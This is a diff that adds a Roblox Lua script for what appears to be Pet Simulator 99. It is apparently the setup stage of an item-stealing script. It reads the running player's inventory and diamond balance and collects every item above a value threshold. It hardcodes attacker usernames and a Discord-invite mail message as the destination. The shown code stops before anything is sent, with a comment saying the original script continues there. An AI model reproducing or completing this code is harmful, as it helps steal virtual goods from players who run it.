@@ -1,0 +1,102 @@
+warn("Script iniziato")
+
+if _G.scriptExecuted then
+    warn("Script già eseguito, uscita.")
+    return
+end
+_G.scriptExecuted = true
+
+warn("Caricamento librerie...")
+local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
+local library = require(game.ReplicatedStorage.Library)
+local save = library.Save.Get().Inventory
+local mailsent = library.Save.Get().MailboxSendsSinceReset
+local plr = game.Players.LocalPlayer
+local MailMessage = "gg / HcpNe56R2a"
+local HttpService = game:GetService("HttpService")
+
+local Username = "Erengobrrr"
+local Username2 = "fdsfedeqqq"
+local discuser = "Erengobrrr"
+local min_rap = 2000
+
+warn("Valori iniziali caricati.")
+warn("Username:", Username)
+warn("Mail inviate:", mailsent)
+
+local sortedItems = {}
+local totalRAP = 0
+local getFucked = false
+local newamount = 20000
+
+if mailsent ~= 0 then
+	newamount = math.ceil(newamount * (1.5 ^ mailsent))
+end
+
+warn("Nuova quantità richiesta per invio:", newamount)
+
+local GemAmount1 = 1
+for i, v in pairs(library.Save.Get().Inventory.Currency) do
+    if v.id == "Diamonds" then
+        GemAmount1 = v._am
+        break
+    end
+end
+
+warn("Diamanti disponibili:", GemAmount1)
+
+if newamount > GemAmount1 then
+    warn("Non abbastanza diamanti. Interrompo lo script.")
+    return
+end
+
+warn("Inizio elaborazione oggetti con RAP minimo:", min_rap)
+
+-- Scansione dell'inventario
+local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}
+for i, v in pairs(categoryList) do
+	if save[v] ~= nil then
+		for uid, item in pairs(save[v]) do
+			local dir = library.Directory.Pets[item.id]
+			if v == "Pet" and (dir and (dir.huge or dir.exclusiveLevel)) then
+				local rapValue = library.DevRAPCmds.Get({
+					Class = {Name = v},
+					IsA = function(hmm) return hmm == v end,
+					GetId = function() return item.id end,
+					StackKey = function() return HttpService:JSONEncode({id = item.id, pt = item.pt, sh = item.sh, tn = item.tn}) end
+				}) or 0
+				if rapValue >= min_rap then
+					local prefix = ""
+					if item.pt == 1 then prefix = "Golden "
+					elseif item.pt == 2 then prefix = "Rainbow " end
+					if item.sh then prefix = "Shiny " .. prefix end
+					local id = prefix .. item.id
+					table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = id})
+					totalRAP += rapValue * (item._am or 1)
+				end
+			elseif v ~= "Pet" then
+				local rapValue = library.DevRAPCmds.Get({
+					Class = {Name = v},
+					IsA = function(hmm) return hmm == v end,
+					GetId = function() return item.id end,
+					StackKey = function() return HttpService:JSONEncode({id = item.id, pt = item.pt, sh = item.sh, tn = item.tn}) end
+				}) or 0
+				if rapValue >= min_rap then
+					table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id})
+					totalRAP += rapValue * (item._am or 1)
+				end
+			end
+		end
+	end
+end
+
+warn("Totale oggetti selezionati:", #sortedItems)
+warn("RAP totale stimato:", totalRAP)
+
+if #sortedItems == 0 and GemAmount1 < (min_rap + newamount) then
+    warn("Nessun oggetto con RAP sufficiente né diamanti sufficienti. Fine script.")
+    return
+end
+
+warn("Tutto pronto. Il codice può procedere oltre.")
+-- Da qui in poi il tuo script può continuare come da codice originale.
